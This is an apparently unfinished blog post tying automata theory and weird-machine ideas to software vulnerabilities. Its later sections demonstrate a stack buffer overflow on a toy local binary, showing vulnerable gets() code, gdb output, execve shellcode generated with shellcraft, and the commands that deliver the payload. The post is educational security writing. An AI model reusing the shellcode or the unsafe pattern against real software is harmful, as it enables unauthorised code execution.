---
layout: post
comments: true
title: "Notes about theoretical foundation of vulnerabilities"
---

This is a particular post, it's a long tought writing about an argument
that is puzzling my mind lately. It's not something exaustive but I like to
return in future in order to be embarassed by it.


## Computation model

Bear with me, a little excursus about the formal models of computation, the **Automata theory**.
They define a language hierarchy but before going full abstraction maybe we start with the
simplest, **Finite state machine**.

### Finite state machine

The simplest computationa model is named **Finite State Machine** (aka ``FSM``); it's usually
represented as a flowgraph having as nodes the different states of a system; as you can
infer from the name it's characterized by having a finite number of states.

Let's make an example so to introduce you the formalism and notations: take the following
diagram

![example of fsm]()

the **start state** is indicated by the arrow pointing at it from nowhere, the **accept state**
is the one with a double circle and the arrow from one state to another is called **transition**.

What makes transitions happen? when the machine encounters a symbol of an alphabet then
transitions to the state which the arrow with that symbol point to.

Why we are using symbols? because this allows to make the results more generic possible,
indeed at the end, with turing machines is possible to make concrete theorem about formal
system like arithmetic.

We define a string as a concatenation of symbols and when a string passed as input
to a ``FSM`` ends in the accept state then we say that the string is accepted

The set \\(A\\) of all strings accepted by a machine \\(M\\) is named the **language of
the machine** \\(M\\) and it's write as \\(L(M) = A\\)

In all the examples we think the input as a tape with the given string write on it.

A language recognized by this kind of machine is called **regular**; it can be proof
that recognize the same kind of languages of a regular expression (this where the name
come from). At first could be counterintuitive but with after tought a regular expression
defines a set of string, i.e. a language!

It's all fun but there are languages that this model doesn't recognize, for example
the language

$$
\left\{ 0^n1^n\, |\, n\geq0\right\}
$$

is not regular: doesn't exist a ``FSM`` that recognizes it.

For programmers out there, this is the same concept for which you [cannot
parse ``HTML`` using regular expressions](https://stackoverflow.com/a/1732454/1935366)

[Finite State Machines with Output (Mealy and Moore Machines)](https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Seq/fsm.html)

### Pushdown automata

### Turing machine

![](https://upload.wikimedia.org/wikipedia/commons/a/a2/Automata_theory.svg)

## Computation model and real computers

This is fine but are CPU real Turing's machines?
[Turing machines are not intended to model computers, but rather they are intended to model computation itself.](https://en.wikipedia.org/wiki/Turing_machine#Comparison_with_real_machines)

 - https://en.wikipedia.org/wiki/Counter_machine
 - https://en.wikipedia.org/wiki/Random-access_machine

https://en.wikipedia.org/wiki/Post%E2%80%93Turing_machine
https://en.wikipedia.org/wiki/Register_renaming
https://en.wikipedia.org/wiki/Random-access_stored-program_machine
https://cs.stackexchange.com/questions/11514/does-our-pc-work-as-turing-machine

    The RASP is a universal Turing machine (UTM) built on a random-access machine RAM chassis.

Distinction between data, metadata and code.

## Security and vulnerability model

If you are arrived to read up to here, maybe are you asking, what the fuck all
this formalism is connected with a ``rip = 0x4141414141414141``?

The reason to bring up all this formalism is the necessity to summarize
all we know about vulnerabilities  in order to create an unificating theoretical
framework, like in the same way in which modern cryptography works (if you are
a mathematical person I advice you to read [Introduction to Modern cryptography](http://www.cs.umd.edu/~jkatz/imc.html))
The reality is that this framework exists already, and is that written
above.

But let me explain this in detail.

First of all you have to keep in mind that when you are writing a program,
you are writing an emulator for something like a ``FSM``, not a ``TM``:
you have in mind a diagram with the different states of the program and
the transitions between them; take for example this simple program that we'll
call it \\(P\\)

```
int main() {

    char* name = ask_name();
    print_name(name);

    return 0;
}
```

that can be represent with the following diagram

![fms for P]()

Now the problem is how you have implemented the two missing functions:
if you write code like the 90's you can come with a crime like the following

```C
char* ask_name() {
    char* buffer[16];

    gets(buffer);

    return buffer;
}
```

 now it's simple to see that a vulnerability
is when, in whetever way possible, an input breaks the (implicit) **sandbox**
that you have described in your program, allowing the attacker to **escalate
computation model**.

Let me do some example: I start with the king of the vulnerabilities, the **buffer overflow**;
when your program doesn't check correctly the boundary of a buffer it's possible to
write over some metadata used by the calling convention, mainly the return address of the
caller. In the good old time was possible to overwrite it with the address of the buffer itself
that contained some real code, named **shellcode**; the name is originated by the fact that
it's code aimed to open a shell to an attacker. At this point you are passing instruction
directly to the processor.

In this case the original computation model it's escalated from a simple ``FSM`` to
a complete ``TM``.

In moder system (not **IoT** included lol) this is more complicated: a random canary
value is put before the frame boundary, the memory where the stack lives is not executable
so to escalate it's a little more complicated but more **weird**. In practice you
place in your input the addresses of chunk of executable memory containing a certain
numbers of instructions ended with a ``ret``: in this way your are not writing nowhere
code to execute but you are modifying the metadata that the underlying computation model
utilize to emulate your ``FSM``. This is called **Return Oriented Programming** (aka ``ROP``).

This is all fascinating but it's not the end: the arm race between exploiter and security developer
has continued during the years and now more counter measure again these attacks are deployed
in moder operating system: for example, when you create a **rop chain** (i.e. a chain of returns)
you probably need to do some library call, but the mapping of external library is done
at runtime in a random way; this causes an attacker to need some extra information
about the memory organization of the running program. By the way this haven't stopped
vulnerabilities to be exploited.

They are always a **leak** away.

These cases are very simple, imagine programs like video encoder, network services
that need to parse not well defined protocols: this a problem regarding **languages**.

There are people that create weird machines into [The legend of Zelda](https://www.youtube.com/watch?v=fj9u00PMkYU&index=1&list=PLMHq_9wgaCknhiGxknboZdPTLPo2n22fK)
crafting a payload using *music*, *number of lives* and *player's name*.


## Real world

```C
void access() {
    uid_t uid;
    char buffer[];

    uid = getuid();

    gets(buffer);

    if (uid != 0)
        return NO_ACCESS;

    return YES_ACCESS;
}
```

## Simplest

```
Dump of assembler code for function main:
   0x565561bd <+0>:     lea    ecx,[esp+0x4]
   0x565561c1 <+4>:     and    esp,0xfffffff0
   0x565561c4 <+7>:     push   DWORD PTR [ecx-0x4]
   0x565561c7 <+10>:    push   ebp
   0x565561c8 <+11>:    mov    ebp,esp
   0x565561ca <+13>:    push   ebx
   0x565561cb <+14>:    push   ecx
   0x565561cc <+15>:    sub    esp,0x20
   0x565561cf <+18>:    call   0x565560c0 <__x86.get_pc_thunk.bx>
   0x565561d4 <+23>:    add    ebx,0x2e2c
   0x565561da <+29>:    sub    esp,0xc
   0x565561dd <+32>:    lea    eax,[ebx-0x1ff8]
   0x565561e3 <+38>:    push   eax
   0x565561e4 <+39>:    call   0x56556040 <printf@plt>
   0x565561e9 <+44>:    add    esp,0x10
   0x565561ec <+47>:    sub    esp,0x8
   0x565561ef <+50>:    lea    eax,[ebp-0x28]
   0x565561f2 <+53>:    push   eax
   0x565561f3 <+54>:    lea    eax,[ebx-0x1fe5]
   0x565561f9 <+60>:    push   eax
   0x565561fa <+61>:    call   0x56556060 <__isoc99_scanf@plt>
   0x565561ff <+66>:    add    esp,0x10
   0x56556202 <+69>:    sub    esp,0x8
   0x56556205 <+72>:    lea    eax,[ebp-0x28]
   0x56556208 <+75>:    push   eax
   0x56556209 <+76>:    lea    eax,[ebx-0x1fe2]
   0x5655620f <+82>:    push   eax
   0x56556210 <+83>:    call   0x56556040 <printf@plt>
   0x56556215 <+88>:    add    esp,0x10
   0x56556218 <+91>:    mov    eax,0x0
   0x5655621d <+96>:    lea    esp,[ebp-0x8]
   0x56556220 <+99>:    pop    ecx
   0x56556221 <+100>:   pop    ebx
   0x56556222 <+101>:   pop    ebp
   0x56556223 <+102>:   lea    esp,[ecx-0x4]
=> 0x56556226 <+105>:   ret    
End of assembler dump.
```

0xffffcb70 is the address of the ``name`` buffer

```
gef➤  info proc mappings 
process 24102
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804b000     0x3000        0x0 /opt/gipi.github.io/public/code/simplest_excalation
         0x804b000  0x804c000     0x1000     0x2000 /opt/gipi.github.io/public/code/simplest_excalation
         0x804c000  0x804d000     0x1000     0x3000 /opt/gipi.github.io/public/code/simplest_excalation
        0xf7d8d000 0xf7da6000    0x19000        0x0 /lib/i386-linux-gnu/libc-2.27.so
        0xf7da6000 0xf7f60000   0x1ba000    0x19000 /lib/i386-linux-gnu/libc-2.27.so
        0xf7f60000 0xf7f61000     0x1000   0x1d3000 /lib/i386-linux-gnu/libc-2.27.so
        0xf7f61000 0xf7f63000     0x2000   0x1d3000 /lib/i386-linux-gnu/libc-2.27.so
        0xf7f63000 0xf7f64000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
        0xf7f64000 0xf7f67000     0x3000        0x0 
        0xf7fce000 0xf7fd0000     0x2000        0x0 
        0xf7fd0000 0xf7fd3000     0x3000        0x0 [vvar]
        0xf7fd3000 0xf7fd5000     0x2000        0x0 [vdso]
        0xf7fd5000 0xf7fd6000     0x1000        0x0 /lib/i386-linux-gnu/ld-2.27.so
        0xf7fd6000 0xf7ffb000    0x25000     0x1000 /lib/i386-linux-gnu/ld-2.27.so
        0xf7ffc000 0xf7ffd000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
        0xf7ffd000 0xf7ffe000     0x1000    0x27000 /lib/i386-linux-gnu/ld-2.27.so
        0xfffdc000 0xffffe000    0x22000        0x0 [stack]
gef➤  shell cat /proc/24102/maps
08048000-0804b000 r-xp 00000000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
0804b000-0804c000 r-xp 00002000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
0804c000-0804d000 rwxp 00003000 08:11 6696246                            /opt/gipi.github.io/public/code/simplest_excalation
f7d8d000-f7da6000 r-xp 00000000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
f7da6000-f7f60000 r-xp 00019000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
f7f60000-f7f61000 ---p 001d3000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
f7f61000-f7f63000 r-xp 001d3000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
f7f63000-f7f64000 rwxp 001d5000 08:01 6029622                            /lib/i386-linux-gnu/libc-2.27.so
f7f64000-f7f67000 rwxp 00000000 00:00 0 
f7fce000-f7fd0000 rwxp 00000000 00:00 0 
f7fd0000-f7fd3000 r--p 00000000 00:00 0                                  [vvar]
f7fd3000-f7fd5000 r-xp 00000000 00:00 0                                  [vdso]
f7fd5000-f7fd6000 r-xp 00000000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
f7fd6000-f7ffb000 r-xp 00001000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
f7ffc000-f7ffd000 r-xp 00026000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
f7ffd000-f7ffe000 rwxp 00027000 08:01 6029408                            /lib/i386-linux-gnu/ld-2.27.so
fffdc000-ffffe000 rwxp 00000000 00:00 0                                  [stack]
```

first ``eip`` redirection

```
gef➤  r < <(python -c "print '\x74\xcb\xff\xff' + '\xcc'*28 + '\x74\xcb\xff\xff'" )
```

```
$ shellcraft i386.linux.sh -f a
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

the payload organization would be

```
[addr shellcode][     padding     ][addr start buffer][ shellcode ]
                '--- 28 bytes  ---'
```

$ python public/code/exploit_simplest.py public/code/simplest_excalation  PAYLOAD=0xffffc990 > /tmp/payload
$ (cat /tmp/payload ; cat ) | public/code/simplest_excalation

## Summary

> Insecurity is about computation

> exploitation is unexpected computation

> inputs are a language (as in formal language)

[slide](http://langsec.org/insecurity-theory-28c3.pdf) from the talk **The science of security**,
you can found a lot more from http://langsec.org/.

[Page](http://www.cs.dartmouth.edu/~sergey/wm/) about weird machines by halvar flake, in particular
 this [paper](http://www.cs.dartmouth.edu/~sergey/wm/woot13-shapiro.pdf) where uses the ``RTLD`` as a weird machine,
implementing ``add``, ``mov`` and ``jnz`` using relocation entries.
